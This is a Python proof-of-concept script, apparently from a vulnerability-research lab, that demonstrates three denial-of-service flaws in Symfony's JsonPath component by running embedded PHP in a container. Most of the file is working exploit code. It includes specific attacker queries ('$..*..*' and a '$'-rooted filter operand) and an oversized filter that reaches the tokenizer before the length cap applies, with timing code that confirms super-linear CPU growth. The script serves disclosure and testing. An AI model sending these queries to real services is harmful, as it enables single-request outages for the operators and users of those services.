#!/usr/bin/env python3
r"""
VULN-006 — JsonPath: attacker-controlled query causes unbounded node-set / re-parse DoS
            (three uncapped sinks in the new Symfony JsonPath component).

Vulnerable source (targets/symfony/src/Symfony/Component/JsonPath/):
  (a) JsonCrawler.php:809-827  evaluateRecursive()  -> recursive descent "..", array_merge of every
      descendant with NO node-count cap (line 822). Chained "..*" segments compound in
      evaluateTokensOnDecodedData (:184-187), array_merge-ing each segment's node list.
  (b) JsonCrawler.php:126-127  json_decode of the whole raw document on EVERY evaluate() call (no
      memoization); evaluateFilter (:518-519) iterates every element and a "$"-rooted operand in the
      filter re-enters the public evaluate() per element (evaluateScalar :697) -> O(N * docSize).
  (c) Tokenizer/JsonPathTokenizer.php:39-61  tokenize() applies no length guard; the
      MAX_FILTER_EXPRESSION_LENGTH cap is enforced only later in JsonCrawler, AFTER tokenize() has
      already scanned the full filter text with alternation/.*-bearing validation regexes.

CWE-407 (algorithmic complexity) / CWE-1333 (inefficient regex). RFC 9535 explicitly flags the
descendant segment ".." as a resource-consumption hazard.

Flaw (plain English): JsonPath's documented use case is evaluating a CLIENT-SUPPLIED query (filter /
search UIs, JSON-transform endpoints). The component caps filter-expression *text length/depth* but
places no bound on (a) the descendant node-set size / number of ".." segments, (b) repeated full
re-decoding of the document for "$"-rooted filter operands, or (c) the tokenizer-stage input length.

Exploit idea: drive each sink at n / 2n / 4n and measure wall-clock. Super-linear growth (time grows
much faster than input) proves the uncapped algorithm. All inputs are tiny (queries ~7-20 bytes;
documents generated at runtime); the proof is the timing transcript, never host exhaustion.

A successful run proves: a cheap, well-formed attacker query inflicts super-linear CPU on the worker
that evaluates it -> single-request availability DoS (sibling of CVE-2026-45756, a DIFFERENT regex
sink in match()/search()).
"""
import os, sys, math, subprocess

# ---- color log helper (plain when captured to file / NO_COLOR) ---------------------------------
_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}
def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")

# ---- config (env-overridable, defaults match the manifest) ------------------------------------
CONTAINER = os.environ.get("APP_CONTAINER", "cvehunterlab_symfony_app")
# JsonPath is NOT in the lab's composer.json, so it is not registered in the PSR-4 autoloader;
# the source IS mounted though. We register a tiny autoloader shim for the namespace.
JSONPATH_SRC = os.environ.get("JSONPATH_SRC", "/src/src/Symfony/Component/JsonPath")
SIZES_B = os.environ.get("SIZES_B", "500,1000,2000")      # (b) array sizes N / 2N / 4N
DEPTHS_A = os.environ.get("DEPTHS_A", "4,5,6")            # (a) tree depths (branch=4)
SIZES_C = os.environ.get("SIZES_C", "25000,50000,100000") # (c) filter-text lengths

PHP = r'''<?php
require '/app/vendor/autoload.php';
// --- autoload shim: map Symfony\Component\JsonPath\* to the mounted source ---
$BASE = getenv('JSONPATH_SRC');
spl_autoload_register(function($c) use ($BASE){
    $p = 'Symfony\\Component\\JsonPath\\';
    if (str_starts_with($c, $p)) {
        $f = $BASE.'/'.str_replace('\\','/',substr($c, strlen($p))).'.php';
        if (is_file($f)) require $f;
    }
});
use Symfony\Component\JsonPath\JsonCrawler;
if (!class_exists(JsonCrawler::class)) { fwrite(STDERR, "FATAL: JsonCrawler not loadable\n"); exit(3); }

function tree($d,$b){ if($d<=0) return 1; $o=[]; for($i=0;$i<$b;$i++)$o["k$i"]=tree($d-1,$b); return $o; }

// ---- (b) absolute-query ($) operand inside a filter re-decodes the whole doc PER element -------
// Query is a fixed 16 bytes; cost is O(N full re-decodes of an O(N)-sized doc) = O(N^2).
foreach (array_map('intval', explode(',', getenv('SIZES_B'))) as $n) {
    $arr = []; for ($i=0;$i<$n;$i++) $arr[] = ['x'=>$i];
    $doc = json_encode(['y'=>-1, 'arr'=>$arr]);          // y never matches -> full walk, no early exit
    $c = new JsonCrawler($doc);
    $t0 = microtime(true);
    $r = $c->find('$.arr[?@.x==$.y]');
    printf("B n=%d bytes=%d matches=%d time=%.4f\n", $n, strlen($doc), count($r), microtime(true)-$t0);
}

// ---- (a) recursive-descent node-set explosion: fixed 7-byte query, growing document ------------
foreach (array_map('intval', explode(',', getenv('DEPTHS_A'))) as $d) {
    $doc = json_encode(tree($d, 4));
    $c = new JsonCrawler($doc);
    $t0 = microtime(true);
    $r = $c->find('$..*..*');                             // 2 descendant segments, array_merge, no cap
    printf("A depth=%d bytes=%d nodes=%d time=%.4f\n", $d, strlen($doc), count($r), microtime(true)-$t0);
}

// ---- (c) tokenizer scans the uncapped filter text before the length cap applies ----------------
foreach (array_map('intval', explode(',', getenv('SIZES_C'))) as $m) {
    $q = '$[?(@.a=="'.str_repeat('A',$m).'" && @.a)]';   // >10000 => later rejected, but tokenizer runs first
    $c = new JsonCrawler('{"a":1}');
    $t0 = microtime(true);
    try { $c->find($q); } catch (\Throwable $e) {}
    printf("C len=%d bytes=%d time=%.4f\n", $m, strlen($q), microtime(true)-$t0);
}
'''

def run_php():
    cmd = [
        "docker", "exec", "-i",
        "-e", f"JSONPATH_SRC={JSONPATH_SRC}",
        "-e", f"SIZES_B={SIZES_B}",
        "-e", f"DEPTHS_A={DEPTHS_A}",
        "-e", f"SIZES_C={SIZES_C}",
        CONTAINER, "php", "-d", "memory_limit=256M",
    ]
    log("STEP", "running component PoC inside the live container: " + " ".join(cmd))
    p = subprocess.run(cmd, input=PHP, capture_output=True, text=True, timeout=240)
    if p.returncode != 0:
        log("FAIL", f"php exited {p.returncode}\nstdout:\n{p.stdout}\nstderr:\n{p.stderr}")
        sys.exit(2)
    return p.stdout

def parse(out):
    b, a, c = [], [], []
    for line in out.splitlines():
        f = line.split()
        if not f:
            continue
        kv = dict(x.split("=", 1) for x in f[1:] if "=" in x)
        if f[0] == "B": b.append((int(kv["n"]), float(kv["time"]), int(kv["bytes"]), int(kv["matches"])))
        elif f[0] == "A": a.append((int(kv["depth"]), float(kv["time"]), int(kv["bytes"]), int(kv["nodes"])))
        elif f[0] == "C": c.append((int(kv["len"]), float(kv["time"]), int(kv["bytes"])))
    return b, a, c

def exponent(x0, t0, x1, t1):
    # fitted scaling exponent: time ~ x^e
    if t0 <= 0 or x0 <= 0 or x1 <= x0:
        return 0.0
    return math.log(t1 / t0) / math.log(x1 / x0)

def main():
    log("INFO", "VULN-006 — JsonPath attacker-query DoS (3 uncapped sinks)")
    log("INFO", f"target container={CONTAINER}  (queries are 7-20 bytes; documents built at runtime)")
    out = run_php()
    print(out.rstrip())
    b, a, c = parse(out)
    if len(b) < 3 or len(a) < 3 or len(c) < 3:
        log("FAIL", "did not get the expected measurements back")
        sys.exit(2)

    # ---- (b) O(N^2) re-decode -----------------------------------------------------------------
    e_b = exponent(b[0][0], b[0][1], b[-1][0], b[-1][1])
    r_b = b[-1][1] / b[1][1] if b[1][1] else 0          # time ratio on the last doubling
    log("STEP", "(b) $-rooted filter operand re-decodes the whole document per element")
    for n, t, by, m in b:
        log("INFO", f"    N={n:<6} docBytes={by:<7} matches={m}  {t:.4f}s")
    log("PROOF", f"(b) fitted exponent time~N^{e_b:.2f} (1=linear, 2=quadratic); "
                 f"last doubling x{r_b:.1f} (linear would be x2)")

    # ---- (a) recursive-descent node-set explosion --------------------------------------------
    e_a = exponent(a[0][2], a[0][1], a[-1][2], a[-1][1])  # time vs document bytes
    log("STEP", "(a) recursive-descent '..' node-set explosion (fixed 7-byte query '$..*..*')")
    for d, t, by, nodes in a:
        log("INFO", f"    tree(depth={d},b=4) docBytes={by:<6} nodeset={nodes:<6}  {t:.4f}s")
    log("PROOF", f"(a) a 7-byte query returns a node-set up to {max(x[3] for x in a)} nodes; "
                 f"time~bytes^{e_a:.2f} (super-linear) for a 4x-per-step document")

    # ---- (c) uncapped tokenizer scan ----------------------------------------------------------
    e_c = exponent(c[0][0], c[0][1], c[-1][0], c[-1][1])
    log("STEP", "(c) tokenizer scans the full (uncapped) filter text before the length cap applies")
    for m, t, by in c:
        log("INFO", f"    filterLen={m:<6} queryBytes={by:<7}  {t:.4f}s")
    log("PROOF", f"(c) tokenizer cost grows with query length (exponent {e_c:.2f}) despite "
                 f"MAX_FILTER_EXPRESSION_LENGTH=10000 — it is enforced only after tokenize()")

    # ---- verdict: (b) quadratic is the rock-solid leg; (a) corroborates ----------------------
    b_quadratic = e_b >= 1.5 and r_b >= 2.6             # clearly super-linear, well past linear(=2x)
    a_superlinear = e_a >= 1.4
    if b_quadratic and a_superlinear:
        log("OK", f"VULN-006 CONFIRMED — super-linear CPU blowup from attacker-controlled JsonPath "
                  f"queries: sink (b) time~N^{e_b:.2f} (O(N^2) re-decode), sink (a) node-set "
                  f"explosion time~bytes^{e_a:.2f}, sink (c) uncapped tokenizer scan.")
        print("==> VULN-006: CONFIRMED — attacker JsonPath query => super-linear worker CPU DoS (sinks a,b,c).")
        sys.exit(0)
    log("FAIL", f"scaling not super-linear enough (b exp={e_b:.2f} ratio={r_b:.1f}; a exp={e_a:.2f})")
    print("==> VULN-006: FAILED — could not demonstrate super-linear scaling on this host.")
    sys.exit(1)

if __name__ == "__main__":
    main()
